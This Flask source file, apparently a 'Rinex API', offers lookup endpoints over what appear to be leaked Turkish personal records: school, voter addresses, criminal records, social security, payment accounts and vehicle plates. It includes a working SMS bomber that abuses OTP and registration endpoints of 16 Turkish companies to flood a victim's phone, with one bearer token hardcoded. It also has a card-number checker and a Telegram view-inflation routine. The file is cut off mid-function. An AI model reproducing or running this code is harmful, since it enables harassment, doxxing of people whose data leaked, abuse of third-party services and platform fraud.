from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import re
import json
import requests
import time
import threading
from random import choice, randint
from string import ascii_lowercase
from datetime import datetime

app = Flask(__name__)
CORS(app)

# ==================== VERİ DOSYALARI ====================
VERI_DOSYALARI = {
    'eokul': 'eokul.txt',
    'secmen': 'secmen.txt',
    'plaka': 'plaka.txt',
    'sicil': 'sicil.txt',
    'papara': 'papara.txt',
    'sgk': 'sgk.txt',
    'üniversite': 'unuversite.txt'
}

# SMS Bomber için
sms_threads = {}
sms_results = {}

# Telegram Bot Token (OPSİYONEL)
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
STRIPE_SECRET_KEY = os.environ.get('STRIPE_SECRET_KEY', '')

# ==================== DOSYA OKUMA FONKSİYONLARI ====================

def dosyadan_veri_oku(dosya_adi):
    """Dosyayı oku ve satır satır veri döndür"""
    if not os.path.exists(dosya_adi):
        return []
    
    veriler = []
    try:
        with open(dosya_adi, 'r', encoding='utf-8') as dosya:
            for satir in dosya:
                satir = satir.strip()
                if satir:
                    veriler.append(satir)
    except Exception as e:
        print(f"Dosya okuma hatası ({dosya_adi}): {e}")
    return veriler

def dosyada_ara(dosya_adi, sutun, deger, ayrac='|'):
    """Dosyada belirtilen sutunda değeri ara"""
    if not os.path.exists(dosya_adi):
        return []
    
    sonuc = []
    try:
        with open(dosya_adi, 'r', encoding='utf-8') as dosya:
            for satir in dosya:
                satir = satir.strip()
                if not satir:
                    continue
                
                parcalar = [p.strip() for p in satir.split(ayrac)]
                if len(parcalar) > sutun:
                    if deger.upper() in parcalar[sutun].upper():
                        sonuc.append(parcalar)
    except Exception as e:
        print(f"Arama hatası ({dosya_adi}): {e}")
    return sonuc

def dosyada_tam_ara(dosya_adi, sutun, deger, ayrac='|'):
    """Dosyada belirtilen sutunda tam eşleşme ara"""
    if not os.path.exists(dosya_adi):
        return None
    
    try:
        with open(dosya_adi, 'r', encoding='utf-8') as dosya:
            for satir in dosya:
                satir = satir.strip()
                if not satir:
                    continue
                
                parcalar = [p.strip() for p in satir.split(ayrac)]
                if len(parcalar) > sutun:
                    if parcalar[sutun] == deger:
                        return parcalar
    except Exception as e:
        print(f"Arama hatası ({dosya_adi}): {e}")
    return None

# ==================== SMS BOMBER SINIFI ====================

class SendSms:
    def __init__(self, phone):
        self.phone = str(phone)
        self.adet = 0
        self.results = []
        
        rakam = []
        tcNo = ""
        rakam.append(randint(1,9))
        for i in range(1, 9):
            rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.mail = ''.join(choice(ascii_lowercase) for i in range(22)) + "@gmail.com"
    
    def _send_request(self, url, method='POST', headers=None, data=None, json_data=None):
        default_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Dnt": "1",
            "Sec-Gpc": "1",
            "Connection": "keep-alive"
        }
        
        if headers:
            default_headers.update(headers)
        
        try:
            if method.upper() == 'POST':
                if json_data:
                    r = requests.post(url, headers=default_headers, json=json_data, timeout=10)
                else:
                    r = requests.post(url, headers=default_headers, data=data, timeout=10)
            else:
                r = requests.get(url, headers=default_headers, timeout=10)
            return r
        except:
            return None
    
    def KahveDunyasi(self):
        try:
            url = "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number"
            headers = {"X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com"}
            json_data = {"countryCode": "90", "phoneNumber": self.phone}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200 and r.json().get("processStatus") == "Success":
                self.adet += 1
                self.results.append({"service": "KahveDunyasi", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "KahveDunyasi", "status": "failed"})
        return False
    
    def Wmf(self):
        try:
            url = "https://www.wmf.com.tr/users/register/"
            data = {
                "confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail,
                "email_allowed": "true", "first_name": "Memati", "gender": "male",
                "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"
            }
            r = self._send_request(url, data=data)
            if r and r.status_code == 202:
                self.adet += 1
                self.results.append({"service": "Wmf", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Wmf", "status": "failed"})
        return False
    
    def Bim(self):
        try:
            url = "https://bim.veesk.net/service/v1.0/account/login"
            json_data = {"phone": self.phone}
            r = self._send_request(url, json_data=json_data)
            if r and r.status_code == 200:
                self.adet += 1
                self.results.append({"service": "Bim", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Bim", "status": "failed"})
        return False
    
    def Englishhome(self):
        try:
            url = "https://www.englishhome.com/api/member/sendOtp"
            headers = {"Referer": "https://www.englishhome.com/", "Origin": "https://www.englishhome.com"}
            json_data = {"Phone": self.phone, "XID": ""}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200 and r.json().get("isError") == False:
                self.adet += 1
                self.results.append({"service": "Englishhome", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Englishhome", "status": "failed"})
        return False
    
    def Suiste(self):
        try:
            url = "https://suiste.com/api/auth/code"
            headers = {
                "X-Mobillium-Device-Brand": "Apple", "X-Mobillium-Os-Type": "iOS",
                "X-Mobillium-Device-Model": "iPhone", "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330"
            }
            data = {
                "action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330",
                "full_name": "Memati Bas", "gsm": self.phone,
                "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"
            }
            r = self._send_request(url, data=data, headers=headers)
            if r and r.status_code == 200 and r.json().get("code") == "common.success":
                self.adet += 1
                self.results.append({"service": "Suiste", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Suiste", "status": "failed"})
        return False
    
    def KimGb(self):
        try:
            url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp"
            json_data = {"msisdn": f"90{self.phone}"}
            r = self._send_request(url, json_data=json_data)
            if r and r.status_code == 200:
                self.adet += 1
                self.results.append({"service": "KimGb", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "KimGb", "status": "failed"})
        return False
    
    def Evidea(self):
        try:
            url = "https://www.evidea.com/users/register/"
            headers = {
                "X-Project-Name": "undefined", "X-App-Type": "akinon-mobile",
                "X-Requested-With": "XMLHttpRequest", "X-App-Device": "ios"
            }
            data = {
                "first_name": "Memati", "last_name": "Bas", "email": self.mail,
                "email_allowed": "false", "sms_allowed": "true",
                "password": "31ABC..abc31", "phone": f"0{self.phone}", "confirm": "true"
            }
            r = self._send_request(url, data=data, headers=headers)
            if r and r.status_code == 202:
                self.adet += 1
                self.results.append({"service": "Evidea", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Evidea", "status": "failed"})
        return False
    
    def Ucdortbes(self):
        try:
            url = "https://api.345dijital.com/api/users/register"
            json_data = {"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
            r = self._send_request(url, json_data=json_data)
            if r and r.status_code == 200 and r.json().get("error") != "E-Posta veya telefon zaten kayıtlı!":
                self.adet += 1
                self.results.append({"service": "Ucdortbes", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Ucdortbes", "status": "failed"})
        return False
    
    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com/user/graphql"
            headers = {"X-Merchant-Type": "0", "Appversion": "2.4.1", "X-No-Auth": "true", "X-Device-Type": "2"}
            json_data = {
                "operationName": "GENERATE_OTP",
                "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n",
                "variables": {
                    "challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68",
                    "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB",
                    "phone": f"+90{self.phone}"
                }
            }
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200 and r.json().get("data", {}).get("generateOtp") == True:
                self.adet += 1
                self.results.append({"service": "TiklaGelsin", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "TiklaGelsin", "status": "failed"})
        return False
    
    def Naosstars(self):
        try:
            url = "https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            headers = {
                "Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351",
                "Version": "1.0030", "Os": "ios", "Platform": "ios"
            }
            json_data = {"telephone": f"+90{self.phone}", "type": "register"}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200:
                self.adet += 1
                self.results.append({"service": "Naosstars", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Naosstars", "status": "failed"})
        return False
    
    def Koton(self):
        try:
            url = "https://www.koton.com/users/register/"
            headers = {
                "X-Project-Name": "rn-env", "X-App-Type": "akinon-mobile",
                "X-Requested-With": "XMLHttpRequest", "X-App-Device": "ios"
            }
            data = {
                "first_name": "Memati", "last_name": "Bas", "email": self.mail,
                "password": "31ABC..abc31", "phone": f"0{self.phone}",
                "confirm": "true", "sms_allowed": "true", "email_allowed": "true",
                "date_of_birth": "1993-07-02", "call_allowed": "true", "gender": ""
            }
            r = self._send_request(url, data=data, headers=headers)
            if r and r.status_code == 202:
                self.adet += 1
                self.results.append({"service": "Koton", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Koton", "status": "failed"})
        return False
    
    def Hayatsu(self):
        try:
            url = "https://api.hayatsu.com.tr/api/SignUp/SendOtp"
            headers = {
                "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM",
                "Origin": "https://www.hayatsu.com.tr"
            }
            data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
            r = self._send_request(url, data=data, headers=headers)
            if r and r.status_code == 200 and r.json().get("is_success") == True:
                self.adet += 1
                self.results.append({"service": "Hayatsu", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Hayatsu", "status": "failed"})
        return False
    
    def Hizliecza(self):
        try:
            url = "https://prod.hizliecza.net/mobil/account/sendOTP"
            headers = {"Authorization": "Bearer null"}
            json_data = {"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200:
                self.adet += 1
                self.results.append({"service": "Hizliecza", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Hizliecza", "status": "failed"})
        return False
    
    def Metro(self):
        try:
            url = "https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend"
            headers = {"Applicationversion": "2.4.1", "Applicationplatform": "2"}
            json_data = {"methodType": "2", "mobilePhoneNumber": self.phone}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200 and r.json().get("status") == "success":
                self.adet += 1
                self.results.append({"service": "Metro", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Metro", "status": "failed"})
        return False
    
    def File(self):
        try:
            url = "https://api.filemarket.com.tr/v1/otp/send"
            headers = {"X-Os": "IOS", "X-Version": "1.7"}
            json_data = {"mobilePhoneNumber": f"90{self.phone}"}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200 and r.json().get("responseType") == "SUCCESS":
                self.adet += 1
                self.results.append({"service": "File", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "File", "status": "failed"})
        return False
    
    def Akasya(self):
        try:
            url = "https://akasyaapi.poilabs.com/v1/en/sms"
            headers = {"X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5"}
            json_data = {"phone": self.phone}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200 and r.json().get("result") == "SMS sended succesfully!":
                self.adet += 1
                self.results.append({"service": "Akasya", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Akasya", "status": "failed"})
        return False
    
    def run_all(self):
        services = [
            self.KahveDunyasi, self.Wmf, self.Bim, self.Englishhome,
            self.Suiste, self.KimGb, self.Evidea, self.Ucdortbes,
            self.TiklaGelsin, self.Naosstars, self.Koton, self.Hayatsu,
            self.Hizliecza, self.Metro, self.File, self.Akasya
        ]
        
        for service in services:
            try:
                service()
                time.sleep(0.5)
            except:
                pass
        
        return {
            'total': len(services),
            'success': self.adet,
            'failed': len(services) - self.adet,
            'results': self.results
        }

# ==================== CC DOĞRULAMA FONKSİYONLARI ====================

def luhn_kontrol(kart_no):
    kart_no = re.sub(r'\D', '', kart_no)
    if not kart_no.isdigit():
        return False
    toplam = 0
    cift = False
    for rakam in reversed(kart_no):
        rakam = int(rakam)
        if cift:
            rakam *= 2
            if rakam > 9:
                rakam -= 9
        toplam += rakam
        cift = not cift
    return toplam % 10 == 0

def kart_bilgilerini_kontrol(kart_no, ay, yil, cvv):
    hatalar = []
    kart_no = re.sub(r'\D', '', kart_no)
    if len(kart_no) < 13 or len(kart_no) > 19:
        hatalar.append("Kart numarası 13-19 hane arası olmalıdır")
    elif not luhn_kontrol(kart_no):
        hatalar.append("Kart numarası geçersiz (Luhn kontrolü başarısız)")
    try:
        ay_int = int(ay)
        if ay_int < 1 or ay_int > 12:
            hatalar.append("Ay 1-12 arası olmalıdır")
    except ValueError:
        hatalar.append("Geçerli bir ay giriniz")
    try:
        yil_int = int(yil)
        if yil_int < 2024 or yil_int > 2035:
            hatalar.append("Yıl 2024-2035 arası olmalıdır")
    except ValueError:
        hatalar.append("Geçerli bir yıl giriniz")
    if len(str(cvv)) < 3 or len(str(cvv)) > 4:
        hatalar.append("CVV 3-4 hane olmalıdır")
    elif not str(cvv).isdigit():
        hatalar.append("CVV sadece rakam içermelidir")
    return hatalar

# ==================== TELEGRAM FONKSİYONLARI ====================

def telegram_user_info_public(username):
    try:
        if username.startswith('@'):
            username = username[1:]
        
        url = f"https://t.me/{username}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8"
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            content = response.text
            import re
            
            title_match = re.search(r'<title>(.*?)</title>', content)
            title = title_match.group(1) if title_match else ""
            
            desc_match = re.search(r'<meta property="og:description" content="(.*?)"', content)
            description = desc_match.group(1) if desc_match else ""
            
            image_match = re.search(r'<meta property="og:image" content="(.*?)"', content)
            profile_image = image_match.group(1) if image_match else ""
            
            member_match = re.search(r'(\d+[\.,]?\d*)\s*(?:members?|subscribers?)', content, re.IGNORECASE)
            member_count = member_match.group(1) if member_match else "0"
            
            return {
                'success': True,
                'username': username,
                'title': title,
                'display_name': title,
                'description': description,
                'profile_image': profile_image,
                'member_count': member_count,
                'type': 'Kullanıcı' if not member_count or member_count == "0" else 'Kanal/Grup',
                'url': url
            }
        else:
            return {
                'success': False,
                'message': f'@{username} kullanıcısı bulunamadı',
                'username': username
            }
    except Exception as e:
        return {'success': False, 'message': f'Hata: {str(e)}'}

def telegram_post_analyze(post_link):
    try:
        pattern = r't\.me/(?:c/)?([^/]+)/(\d+)'
        match = re.search(pattern, post_link)
        
        if not match:
            return {
                'success': False,
                'message': 'Geçersiz Telegram mesaj linki'
            }
        
        chat_identifier = match.group(1)
        message_id = int(match.group(2))
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8"
        }
        
        response = requests.get(post_link, headers=headers, timeout=10)
        
        if response.status_code == 200:
            content = response.text
            import re
            
            title_match = re.search(r'<meta property="og:title" content="(.*?)"', content)
            title = title_match.group(1) if title_match else ""
            
            desc_match = re.search(r'<meta property="og:description" content="(.*?)"', content)
            description = desc_match.group(1) if desc_match else ""
            
            image_match = re.search(r'<meta property="og:image" content="(.*?)"', content)
            image = image_match.group(1) if image_match else ""
            
            view_match = re.search(r'(\d+[\.,]?\d*)\s*(?:views?|görüntülenme)', content, re.IGNORECASE)
            views = view_match.group(1) if view_match else "0"
            
            return {
                'success': True,
                'chat_identifier': chat_identifier,
                'message_id': message_id,
                'title': title,
                'description': description,
                'image': image,
                'views': views,
                'link': post_link,
                'type': 'Post'
            }
        else:
            return {
                'success': False,
                'message': 'Post bulunamadı veya erişilebilir değil',
                'link': post_link
            }
    except Exception as e:
        return {'success': False, 'message': f'Hata: {str(e)}'}

def telegram_post_view_simulate(post_link, count=1):
    results = []
    success_count = 0
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
    ]
    
    for i in range(count):
        try:
            headers = {
                "User-Agent": choice(user_agents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Referer": "https://t.me/",
                "Dnt": "1",
                "Sec-Gpc": "1"
            }
            
            response = requests.get(post_link, headers=headers, timeout=10)
            
            if response.status_code == 200:
                success_count += 1
                results.append({
                    'attempt': i + 1,
                    'status': 'success',
                    'user_agent': headers["User-Agent"][:50] + "..."
                })
            else:
                results.append({
                    'attempt': i + 1,
                    'status': 'failed',
                    'status_code': response.status_code
                })
            
            time.sleep(0.5)
        except Exception as e:
            results.append({
                'attempt': i + 1,
                'status': 'error',
                'message': str(e)
            })
    
    return {
        'total': count,
        'success': success_count,
        'failed': count - success_count,
        'results': results,
        'link': post_link
    }

# ==================== ANA SAYFA (GIF'Lİ) ====================

@app.route('/', methods=['GET'])
def ana_sayfa():
    """Ana sayfa - GIF ve API bilgileri"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Rinex API</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                background: linear-gradient(135deg, #0a0a0a, #1a1a2e, #16213e);
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                overflow-x: hidden;
            }
            .container {
                text-align: center;
                padding: 20px;
                max-width: 800px;
                width: 100%;
            }
            .gif-container {
                width: 100%;
                max-width: 400px;
                margin: 0 auto 30px auto;
                border-radius: 20px;
                overflow: hidden;
                box-shadow: 0 0 40px rgba(100, 100, 255, 0.3);
                border: 2px solid rgba(100, 100, 255, 0.2);
                animation: glow 3s ease-in-out infinite;
            }
            .gif-container img {
                width: 100%;
                height: auto;
                display: block;
            }
            @keyframes glow {
                0%, 100% { box-shadow: 0 0 40px rgba(100, 100, 255, 0.3); }
                50% { box-shadow: 0 0 80px rgba(100, 100, 255, 0.6); }
            }
            .title {
                color: #fff;
                font-size: 2.5em;
                margin: 10px 0;
                font-weight: 700;
                background: linear-gradient(90deg, #00d2ff, #3a7bd5, #00d2ff);
                background-size: 300% 300%;
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                animation: gradient 4s ease-in-out infinite;
            }
            @keyframes gradient {
                0%, 100% { background-position: 0% 50%; }
                50% { background-position: 100% 50%; }
            }
            .subtitle {
                color: #8888aa;
                font-size: 1.1em;
                margin: 5px 0 20px 0;
                letter-spacing: 2px;
            }
            .status {
                display: inline-block;
                background: rgba(0, 255, 100, 0.15);
                color: #00ff88;
                padding: 8px 20px;
                border-radius: 30px;
                font-size: 0.9em;
                border: 1px solid rgba(0, 255, 100, 0.2);
                margin-bottom: 20px;
                animation: pulse 2s ease-in-out infinite;
            }
            @keyframes pulse {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.6; }
            }
            .endpoints {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 15px;
                margin-top: 25px;
            }
            .endpoint-card {
                background: rgba(255, 255, 255, 0.05);
                backdrop-filter: blur(10px);
                border-radius: 15px;
                padding: 18px;
                border: 1px solid rgba(255, 255, 255, 0.08);
                transition: all 0.3s ease;
                text-align: left;
            }
            .endpoint-card:hover {
                transform: translateY(-5px);
                background: rgba(255, 255, 255, 0.1);
                border-color: rgba(100, 100, 255, 0.3);
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            }
            .endpoint-card .name {
                color: #00d2ff;
                font-size: 0.9em;
                font-weight: 600;
                margin-bottom: 5px;
            }
            .endpoint-card .path {
                color: #aaaacc;
                font-size: 0.7em;
                font-family: monospace;
                word-break: break-all;
                background: rgba(0, 0, 0, 0.3);
                padding: 4px 8px;
                border-radius: 5px;
                display: inline-block;
            }
            .endpoint-card .desc {
                color: #8888aa;
                font-size: 0.75em;
                margin-top: 5px;
            }
            .footer {
                color: #555577;
                font-size: 0.8em;
                margin-top: 30px;
                border-top: 1px solid rgba(255, 255, 255, 0.05);
                padding-top: 20px;
            }
            .footer a {
                color: #00d2ff;
                text-decoration: none;
            }
            .footer a:hover {
                text-decoration: underline;
            }
            @media (max-width: 600px) {
                .title { font-size: 1.8em; }
                .endpoints { grid-template-columns: 1fr; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="gif-container">
                <img src="https://tenor.com/i83GbmmKdwe.gif" alt="Rinex API" />
            </div>
            <div class="title">@rinexdestek</div>
            <div class="subtitle">⚡ API GATEWAY</div>
            <div class="status">🟢 Tüm sistemler çalışıyor</div>
            
            <div class="endpoints">
                <div class="endpoint-card">
                    <div class="name">📚 E-Okul</div>
                    <div class="path">/eokul/api?tc=11060326504</div>
                    <div class="desc">TC, Ad, Soyad ile sorgulama</div>
                </div>
                <div class="endpoint-card">
                    <div class="name">🗳️ Seçmen</div>
                    <div class="path">/secmen/api?tc=18445070762</div>
                    <div class="desc">TC, Ad, Soyad, İl ile sorgulama</div>
                </div>
                <div class="endpoint-card">
                    <div class="name">🚗 Plaka</div>
                    <div class="path">/plaka/api?plaka=41HU096</div>
                    <div class="desc">Plaka ↔ Ad-Soyad dönüşümü</div>
                </div>
                <div class="endpoint-card">
                    <div class="name">💳 Papara</div>
                    <div class="path">/papara/api?papara_id=1354693996</div>
                    <div class="desc">Papara ID ↔ Ad-Soyad dönüşümü</div>
                </div>
                <div class="endpoint-card">
                    <div class="name">📋 Sicil</div>
                    <div class="path">/sicil/api?tc=19402658634</div>
                    <div class="desc">TC, Ad, Soyad ile sorgulama</div>
                </div>
                <div class="endpoint-card">
                    <div class="name">🏛️ SGK</div>
                    <div class="path">/sgk/api?tc=10001337050</div>
                    <div class="desc">TC, Ad, Soyad ile sorgulama</div>
                </div>
                <div class="endpoint-card">
                    <div class="name">🎓 Üniversite</div>
                    <div class="path">/universite/api?tc=98097940397</div>
                    <div class="desc">TC, Ad-Soyad, Okul ile sorgulama</div>
                </div>
                <div class="endpoint-card">
                    <div class="name">💣 SMS Bomber</div>
                    <div class="path">/smsbomber/bombala?telefon=5551234567</div>
                    <div class="desc">SMS bombası gönderir (0 olmadan)</div>
                </div>
                <div class="endpoint-card">
                    <div class="name">💳 CC Doğrulama</div>
                    <div class="path">/cc/luhn?kart=4111111111111111</div>
                    <div class="desc">Kredi kartı doğrulama (Luhn)</div>
                </div>
                <div class="endpoint-card">
                    <div class="name">📱 Telegram</div>
                    <div class="path">/telegram/user?username=@username</div>
                    <div class="desc">Token gerektirmez - Public bilgiler</div>
                </div>
            </div>
            
            <div class="footer">
                <p>🔗 DESTEK HATTİ 📞: <a href="https://t.me/rinexdestek">eokulsorguapi.onrender.com</a></p>
                <p>📌 Tüm sorgular JSON formatında döner</p>
            </div>
        </div>
    </body>
    </html>
    '''

# ==================== E-OKUL API ====================

@app.route('/eokul', methods=['GET'])
def eokul_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'E-Okul Sorgulama API',
        'kullanım': {
            'tc': '/eokul/api?tc=11060326504',
            'ad': '/eokul/api?ad=gazel',
            'soyad': '/eokul/api?soyad=atila'
        }
    })

@app.route('/eokul/api', methods=['GET'])
def eokul_sorgula():
    tc = request.args.get('tc', '').strip()
    ad = request.args.get('ad', '').strip()
    soyad = request.args.get('soyad', '').strip()
    dosya = 'eokul.txt'
    
    if not os.path.exists(dosya):
        return jsonify({'durum': 'hata', 'mesaj': 'Veri dosyası bulunamadı'}), 404
    
    if tc:
        sonuc = dosyada_tam_ara(dosya, 0, tc)
        if sonuc:
            return jsonify({
                'tc': sonuc[0],
                'ad': sonuc[1],
                'soyad': sonuc[2],
                'dogum': sonuc[3],
                'universite': sonuc[4]
            })
        return jsonify({'durum': 'hata', 'mesaj': f'{tc} TC bulunamadı'}), 404
    
    if ad and soyad:
        sonuc = dosyada_ara(dosya, 1, ad)
        sonuc = [s for s in sonuc if soyad.upper() in s[2].upper()]
        if sonuc:
            return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
        return jsonify({'durum': 'hata', 'mesaj': f'{ad} {soyad} bulunamadı'}), 404
    
    if ad:
        sonuc = dosyada_ara(dosya, 1, ad)
        if sonuc:
            return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
        return jsonify({'durum': 'hata', 'mesaj': f'{ad} bulunamadı'}), 404
    
    if soyad:
        sonuc = dosyada_ara(dosya, 2, soyad)
        if sonuc:
            return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
        return jsonify({'durum': 'hata', 'mesaj': f'{soyad} bulunamadı'}), 404
    
    return jsonify({'durum': 'hata', 'mesaj': 'Lütfen tc, ad veya soyad girin'}), 400

# ==================== SEÇMEN API ====================

@app.route('/secmen', methods=['GET'])
def secmen_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'Seçmen Sorgulama API',
        'kullanım': {
            'tc': '/secmen/api?tc=18445070762',
            'ad': '/secmen/api?ad=ahmet',
            'soyad': '/secmen/api?soyad=aydoğdu',
            'il': '/secmen/api?il=adana'
        }
    })

@app.route('/secmen/api', methods=['GET'])
def secmen_sorgula():
    tc = request.args.get('tc', '').strip()
    ad = request.args.get('ad', '').strip()
    soyad = request.args.get('soyad', '').strip()
    il = request.args.get('il', '').strip()
    adres = request.args.get('adres', '').strip()
    dosya = 'secmen.txt'
    
    if not os.path.exists(dosya):
        return jsonify({'durum': 'hata', 'mesaj': 'Veri dosyası bulunamadı'}), 404
    
    if tc:
        sonuc = dosyada_tam_ara(dosya, 0, tc)
        if sonuc:
            return jsonify({
                'tc': sonuc[0],
                'ad': sonuc[1],
                'soyad': sonuc[2],
                'il': sonuc[3],
                'adres': sonuc[4]
            })
        return jsonify({'durum': 'hata', 'mesaj': f'{tc} TC bulunamadı'}), 404
    
    sonuc = []
    with open(dosya, 'r', encoding='utf-8') as f:
        for satir in f:
            satir = satir.strip()
            if not satir:
                continue
            p = [x.strip() for x in satir.split('|')]
            if len(p) >= 5:
                if ad and ad.upper() not in p[1].upper():
                    continue
                if soyad and soyad.upper() not in p[2].upper():
                    continue
                if il and il.upper() not in p[3].upper():
                    continue
                if adres and adres.upper() not in p[4].upper():
                    continue
                sonuc.append(p)
    
    if sonuc:
        return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
    return jsonify({'durum': 'hata', 'mesaj': 'Kayıt bulunamadı'}), 404

# ==================== PLAKA API ====================

@app.route('/plaka', methods=['GET'])
def plaka_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'Plaka Sorgulama API - Plaka ↔ Ad-Soyad Dönüşümü',
        'kullanım': {
            'plaka_ile': '/plaka/api?plaka=41HU096 → Ad-Soyad',
            'isim_ile': '/plaka/api?ad_soyad=CEVDET ALKIŞ → Plaka'
        }
    })

@app.route('/plaka/api', methods=['GET'])
def plaka_sorgula():
    plaka = request.args.get('plaka', '').strip().upper()
